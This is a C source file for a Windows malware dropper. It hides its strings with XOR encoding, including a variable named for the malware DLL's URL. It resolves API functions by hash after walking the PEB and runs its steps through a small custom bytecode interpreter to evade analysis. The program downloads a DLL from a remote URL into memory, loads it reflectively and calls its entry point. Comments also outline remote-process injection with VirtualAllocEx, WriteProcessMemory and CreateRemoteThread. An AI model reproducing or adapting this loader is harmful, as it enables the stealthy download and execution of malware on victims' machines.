#include "mmLoader.h"
#include "strings.h"
#include <stdbool.h>
#include <winbase.h>
#include <windows.h>
#include <wininet.h>
#include <winternl.h>

NTSYSAPI
PVOID
NTAPI
RtlReAllocateHeap(IN PVOID HeapHandle, IN ULONG Flags, IN PVOID MemoryPointer,
                  IN ULONG Size);

#define ALWAYS_INLINE inline __attribute__((always_inline))
#define NEVER_INLINE __attribute__((noinline))

#ifdef FREESTANDING
#define CRASH() __asm__("ud2")
#else
#define CRASH() EXIT(1)
#endif

#define EXIT(code) _Exit(code)

#define DIE(...)                                                               \
  do {                                                                         \
    DEBUG(__VA_ARGS__);                                                        \
    CRASH();                                                                   \
  } while (0)

#define CHECK(cond, msg)                                                       \
  if (!(cond)) {                                                               \
    DIE("Error: check %s failed: %s\n", #cond, msg);                           \
  }

#ifdef FREESTANDING
#define DEBUG(...)
#else
#include <stdio.h>
#define DEBUG(...) fprintf(stderr, __VA_ARGS__)
#endif

#define DECLARE(f) __typeof__(f) *my##f = NULL;

#define LAIKA_VAR_MAX 512

#define LAIKA_BOX_STARTVAR(type, name, skid, data)                             \
  type name;                                                                   \
  unsigned char name##_data[] = data;                                          \
  unsigned char name##_skidData[LAIKA_VAR_MAX] = {0};                          \
  for (int i = 0; i < LAIKA_VAR_MAX; i++) {                                    \
    name##_skidData[i] = name##_data[i] ^ skid;                                \
  }                                                                            \
  name = (type)name##_skidData;

#define LAIKA_BOX_ENDVAR(name)                                                 \
  for (int i = 0; i < LAIKA_VAR_MAX; i++) {                                    \
    name##_skidData[i] = 0;                                                    \
  }

static ALWAYS_INLINE HMODULE FindKernel32() {
  PPEB pebPtr = NtCurrentTeb()->ProcessEnvironmentBlock;
  PPEB_LDR_DATA ldr = pebPtr->Ldr;
  PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
  PLIST_ENTRY kernel_exe = head->Flink;
  PLIST_ENTRY ntdll_dll = kernel_exe->Flink;
  PLIST_ENTRY kernel32_dll = ntdll_dll->Flink;
  return CONTAINING_RECORD(kernel32_dll, LDR_DATA_TABLE_ENTRY,
                           InMemoryOrderLinks)
      ->DllBase;
}
static ALWAYS_INLINE DWORD hashOf(const char *data) {
  // https://cocomelonc.github.io/tutorial/2022/04/02/malware-injection-18.html
  DWORD hash = 0x35;
  for (int i = 0; i < data[i] != '\0'; i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}
static ALWAYS_INLINE LPVOID FindFuncInModule(HMODULE h, DWORD myHash) {
  // https://cocomelonc.github.io/tutorial/2022/04/02/malware-injection-18.html
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  CHECK(img_dos_header->e_magic == 0x5A4D, "bad dos header magic");
  PIMAGE_NT_HEADERS img_nt_header =
      (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  CHECK(img_nt_header->Signature == 0x4550, "bad header signature");
  PIMAGE_EXPORT_DIRECTORY img_edt =
      (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)h +
                                img_nt_header->OptionalHeader
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                    .VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
    if (hashOf(pFuncName) == myHash) {
      uintptr_t addr = fAddr[fOrd[i]];
      if (addr >
              img_nt_header->OptionalHeader.DataDirectory[0].VirtualAddress &&
          addr < img_nt_header->OptionalHeader.DataDirectory[0].VirtualAddress +
                     img_nt_header->OptionalHeader.DataDirectory[0].Size) {
        // Function is forwarded!
        char *forward = (char *)((LPBYTE)h + addr);
        DIE("Forwarded! %s is actually in %s\n", pFuncName, forward);
      }
      LPVOID result = (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
      DEBUG("Found function %s=0x%p (hash 0x%p)\n", pFuncName, result, myHash);
      return result;
    }
  }
  DIE("[!] Failed to find GetProcAddress\n");
}

static ALWAYS_INLINE void BareWriteStdout(HMODULE hkernel32, char *msg) {
#ifndef NDEBUG
  DECLARE(GetStdHandle)
  DECLARE(WriteFile)
  myGetStdHandle = FindFuncInModule(hkernel32, hashOf("GetStdHandle"));
  myWriteFile = FindFuncInModule(hkernel32, hashOf("WriteFile"));
  DWORD len = 0;
  for (len = 0; msg[len] != '\0'; len++)
    ;
  HANDLE mystdout = myGetStdHandle(STD_OUTPUT_HANDLE);
  myWriteFile(mystdout, msg, len, (DWORD[]){0}, NULL);
#endif
}

typedef intptr_t word;
typedef uintptr_t uword;

typedef struct {
  uintptr_t value;
} Object;

#include "opcodes.h"

typedef enum {
#define ENUM(name) name,
  FOR_EACH_INSTRUCTION(ENUM)
#undef ENUM
} Instruction;

typedef uword (*Function0)();
typedef uword (*Function1)(uword);
typedef uword (*Function2)(uword, uword);
typedef uword (*Function3)(uword, uword, uword);
typedef uword (*Function4)(uword, uword, uword, uword);
typedef uword (*Function5)(uword, uword, uword, uword, uword);
typedef uword (*Function8)(uword, uword, uword, uword, uword, uword, uword,
                           uword);

static NEVER_INLINE Object Execute(uword *program) {
  Object accumulator = {0};
  Object locals[256] = {0};
  Object stack[256] = {0};
  word sp = 0;
  Object tmp;
#define DO_PUSH(x) (stack[sp++] = (x))
#define DO_POP() (tmp = stack[--sp], stack[sp] = (Object){0}, tmp)

  static const void *const dispatch_table[] = {
#define ENTRY(name) &&handle##name,
      FOR_EACH_INSTRUCTION(ENTRY)
#undef ENTRY
  };

#define next_label() dispatch_table[*program++]

  goto *next_label();

handleLOAD_IMMEDIATE : {
  uword value = (uword)*program++;
  accumulator = (Object){value};
  goto *next_label();
}
handleSTORE_LOCAL : {
  uword idx = (uword)*program++;
  locals[idx] = accumulator;
  goto *next_label();
}
handleLOAD_LOCAL : {
  uword idx = (uword)*program++;
  accumulator = locals[idx];
  goto *next_label();
}
handlePUSH : {
  DO_PUSH(accumulator);
  goto *next_label();
}
handlePOP : {
  accumulator = DO_POP();
  goto *next_label();
}
handleCALL : {
  // TODO(max): Figure out how to use __builtin_apply.
  // https://github.com/barak/lysp/blob/e893171ae13e9a632f36cf63efbd62771e2f7234/lysp.c#L470
  word argc = (word)*program++;
  if (argc == 0) {
    void *function = (void *)DO_POP().value;
    accumulator.value = ((Function0)function)();
    goto *next_label();
  } else if (argc == 1) {
    uword arg1 = DO_POP().value;
    void *function = (void *)DO_POP().value;
    accumulator.value = ((Function1)function)(arg1);
    goto *next_label();
  } else if (argc == 2) {
    uword arg2 = DO_POP().value;
    uword arg1 = DO_POP().value;
    void *function = (void *)DO_POP().value;
    accumulator.value = ((Function2)function)(arg1, arg2);
    goto *next_label();
  } else if (argc == 3) {
    uword arg3 = DO_POP().value;
    uword arg2 = DO_POP().value;
    uword arg1 = DO_POP().value;
    void *function = (void *)DO_POP().value;
    accumulator.value = ((Function3)function)(arg1, arg2, arg3);
    goto *next_label();
  } else if (argc == 5) {
    uword arg5 = DO_POP().value;
    uword arg4 = DO_POP().value;
    uword arg3 = DO_POP().value;
    uword arg2 = DO_POP().value;
    uword arg1 = DO_POP().value;
    void *function = (void *)DO_POP().value;
    accumulator.value = ((Function5)function)(arg1, arg2, arg3, arg4, arg5);
    goto *next_label();
  } else if (argc == 8) {
    uword arg8 = DO_POP().value;
    uword arg7 = DO_POP().value;
    uword arg6 = DO_POP().value;
    uword arg5 = DO_POP().value;
    uword arg4 = DO_POP().value;
    uword arg3 = DO_POP().value;
    uword arg2 = DO_POP().value;
    uword arg1 = DO_POP().value;
    void *function = (void *)DO_POP().value;
    accumulator.value =
        ((Function8)function)(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8);
    goto *next_label();
  } else {
    DIE("Cannot yet call with arity %d\n", argc);
  }
  goto *next_label();
}
handleGUARD_NOT_ZERO : {
  CHECK(accumulator.value != 0, "unexpected zero");
  goto *next_label();
}
handleGUARD_ZERO : {
  CHECK(accumulator.value == 0, "unexpected non-zero");
  goto *next_label();
}
handlePRINT : {
  const char *msg = (const char *)*program++;
  DEBUG("%s", msg);
  goto *next_label();
}
handleHALT : { return accumulator; }
}

static intptr_t NewBufferSize(intptr_t old_size, intptr_t min_size) {
  intptr_t new_size = old_size;
  while (new_size < min_size) {
    new_size *= 2;
  }
  return new_size;
}

// TODO(max): Move this into the VM
static char *
DownloadToMemory(__typeof__(InternetOpenA) *myInternetOpenA,
                 __typeof__(InternetOpenUrlA) *myInternetOpenUrlA,
                 __typeof__(InternetReadFile) *myInternetReadFile,
                 __typeof__(InternetCloseHandle) *myInternetCloseHandle,
                 __typeof__(RtlAllocateHeap) *myHeapAlloc,
                 __typeof__(RtlReAllocateHeap) *myHeapReAlloc, HANDLE heap,
                 const char *url) {
#define BUFREAD 100
  HINTERNET hInternet = (*myInternetOpenA)(
      "User-Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  CHECK(hInternet, "Failed to open internet\n");
  HINTERNET hConnect = (*myInternetOpenUrlA)(
      hInternet, url, NULL, 0,
      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
          INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RAW_DATA,
      0);
  CHECK(hConnect, "Failed to open URL\n");
  DWORD bytesRead;
  word bufferSize = NewBufferSize(1, BUFREAD);
  word totalRead = 0;
  char *buffer = (*myHeapAlloc)(heap, HEAP_ZERO_MEMORY, bufferSize);
  CHECK(buffer, "Failed to realloc buffer\n");
  word numReads = 0;
  while ((*myInternetReadFile)(hConnect, buffer + totalRead, BUFREAD,
                               &bytesRead) &&
         bytesRead != 0) {
    numReads++;
    totalRead += bytesRead;
    if (totalRead + BUFREAD > bufferSize) {
      bufferSize = NewBufferSize(bufferSize, totalRead + BUFREAD);
      buffer = (*myHeapReAlloc)(heap, 0, buffer, bufferSize);
      CHECK(buffer, "Failed to realloc buffer\n");
    }
  }
  (*myInternetCloseHandle)(hConnect);
  (*myInternetCloseHandle)(hInternet);
  DEBUG("Total bytes read: %ld with %ld calls\n", totalRead, numReads);
  return buffer;
}

// TODO(max): Maybe steal
// https://github.com/strongswan/strongswan/blob/1301c762d4b8093434856772467ff5e3306fe584/src/libcharon/plugins/kernel_wfp/kernel_wfp_compat.c#L149
// idea

// TODO(max): FreeConsole?
#ifdef FREESTANDING
int WINAPI mainCRTStartup(void) {
#else
int WINAPI main(void) {
#endif

  const uword hash_GetProcAddress = 0x000000001ac1e8e1;
  const uword hash_LoadLibraryA = 0x00000000030aa4dd;
  const uword hash_ExitProcess = 0x0000000001015de0;
  const uword hash_URLDownloadToFileA = 0x000000008cfb1100;
  const uword hash_FreeConsole = 0xff6a46;
  const uword hash_InternetOpenA = 0x91a4f71;
  const uword hash_InternetOpenUrlA = 0xf5c6688e;
  const uword hash_InternetReadFile = 0xf5c65a24;
  const uword hash_InternetCloseHandle = 0x19ebe23aa6;
  const uword hash_HeapCreate = 0x546c71;
  const uword hash_HeapAlloc = 0x1c2318;
  const uword hash_HeapReAlloc = 0xfd59b1;
  const uword hash_RtlAllocateHeap = 0x54680d8e;
  const uword hash_RtlReAllocateHeap = 0x2f899fec1;

  enum {
    hkernel32,
    hntdll,
    hwininet,
    hmalware,
    heap,
    buffer,
    entrypoint,
    myGetProcAddress,
    myLoadLibraryA,
    myExitProcess,
    myFreeConsole,
    myInternetOpenA,
    myInternetOpenUrlA,
    myInternetReadFile,
    myInternetCloseHandle,
    myHeapCreate,
    myHeapAlloc,
    myHeapReAlloc,
    myRtlAllocateHeap,
    myRtlReAllocateHeap,
  };

#define imm(x) LOAD_IMMEDIATE, (uword)(x)
#define local(x) LOAD_LOCAL, x
#define push(...) __VA_ARGS__, PUSH
#define call0(f) push(f), CALL, 0
#define call1(f, arg1) push(f), push(arg1), CALL, 1
#define call2(f, arg1, arg2) push(f), push(arg1), push(arg2), CALL, 2
#define call3(f, arg1, arg2, arg3)                                             \
  push(f), push(arg1), push(arg2), push(arg3), CALL, 3
#define call5(f, arg1, arg2, arg3, arg4, arg5)                                 \
  push(f), push(arg1), push(arg2), push(arg3), push(arg4), push(arg5), CALL, 5
#define call8(f, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8)               \
  push(f), push(arg1), push(arg2), push(arg3), push(arg4), push(arg5),         \
      push(arg6), push(arg7), push(arg8), CALL, 8

#define LOAD_FUNC(dll, name)                                                   \
  call2(imm(FindFuncInModule), local(h##dll), imm(hash_##name)),               \
      GUARD_NOT_ZERO, STORE_LOCAL, my##name

#define LOAD_DLL(name)                                                         \
  call1(local(myLoadLibraryA), imm(name)), GUARD_NOT_ZERO, STORE_LOCAL, h##name

  LAIKA_BOX_STARTVAR(char *, malware_dll_url, KEY_malware_dll_url,
                     DATA_malware_dll_url)
  LAIKA_BOX_STARTVAR(char *, malware_dll_filename, KEY_malware_dll_filename,
                     DATA_malware_dll_filename)
  LAIKA_BOX_STARTVAR(char *, malware_entrypoint, KEY_malware_entrypoint,
                     DATA_malware_entrypoint)
  LAIKA_BOX_STARTVAR(char *, wininet, KEY_wininet, DATA_wininet)
  LAIKA_BOX_STARTVAR(char *, ntdll, KEY_ntdll, DATA_ntdll)
  LAIKA_BOX_STARTVAR(char *, flex_msg, KEY_flex_msg, DATA_flex_msg)
  DWORD dwError = 0;
  // clang-format off
  uword program[] = {
      // Call FindKernel32
      call0(imm(FindKernel32)),
      STORE_LOCAL,
      hkernel32,
  // Load functions from kernel32
#ifdef FREESTANDING
      LOAD_FUNC(kernel32, FreeConsole),
      call0(local(myFreeConsole)),
#endif
      LOAD_FUNC(kernel32, GetProcAddress),
      LOAD_FUNC(kernel32, LoadLibraryA),
      LOAD_FUNC(kernel32, ExitProcess),
      LOAD_FUNC(kernel32, HeapCreate),
      LOAD_DLL(ntdll),
      LOAD_FUNC(ntdll, RtlAllocateHeap),
      LOAD_FUNC(ntdll, RtlReAllocateHeap),
      // Load wininet.dll
      LOAD_DLL(wininet),
      LOAD_FUNC(wininet, InternetOpenA),
      LOAD_FUNC(wininet, InternetOpenUrlA),
      LOAD_FUNC(wininet, InternetReadFile),
      LOAD_FUNC(wininet, InternetCloseHandle),
      // Download the file to memory
      call3(local(myHeapCreate), imm(0), imm(0), imm(0)),
      GUARD_NOT_ZERO,
      STORE_LOCAL, heap,
      call8(imm(DownloadToMemory),
            local(myInternetOpenA),
            local(myInternetOpenUrlA),
            local(myInternetReadFile),
            local(myInternetCloseHandle),
            local(myRtlAllocateHeap),
            local(myRtlReAllocateHeap),
            local(heap),
            imm(malware_dll_url)),
      GUARD_NOT_ZERO,
      STORE_LOCAL, buffer,
      // Initialize mmLoader
      call1(imm(InitApiTable), local(myLoadLibraryA)),
      // Load the DLL
      call3(imm(LoadMemModule), local(buffer), /*bCallEntry=*/imm(1), imm(&dwError)),
      GUARD_NOT_ZERO,
      STORE_LOCAL, hmalware,
      call2(imm(GetMemModuleProc), local(hmalware), imm(malware_entrypoint)),
      GUARD_NOT_ZERO,
      STORE_LOCAL, entrypoint,
      call0(local(entrypoint)),
      // OR
      // 1. Find process using GetCurrentProcessId
      // 2. Open process using OpenProcess
      // 3. Allocate DLL loader "shellcode" in the remote process using
      //    VirtualAllocEx
      // 4. Write the DLL loader "shellcode" into the remote process using
      //    WriteProcessMemory
      // 5. Allocate the DLL name in the remote process using VirtualAllocEx
      // 6. Write the DLL name into the remote process using WriteProcessMemory
      // 7. Call the "shellcode" in the remote process using CreateRemoteThread
      // 8. Close the handle to the remote process using CloseHandle
      // Flex.
      call2(imm(BareWriteStdout), local(hkernel32), imm(flex_msg)),
      // This binary can work in two modes: in "normal" mode, we have a main
      // function and that's called by the Windows stdlib. Returning from main
      // exits the program. In "freestanding" mode, it needs to provide its own
      // mainCRTStartup function and manually call exit.
      call1(local(myExitProcess), imm(0)),
      HALT,
      (uword)&program[0],
  };
  // clang-format on
  Execute(program);
  LAIKA_BOX_ENDVAR(flex_msg)
  LAIKA_BOX_ENDVAR(wininet)
  LAIKA_BOX_ENDVAR(ntdll)
  LAIKA_BOX_ENDVAR(malware_entrypoint)
  LAIKA_BOX_ENDVAR(malware_dll_filename)
  LAIKA_BOX_ENDVAR(malware_dll_url)
  return 0;
}
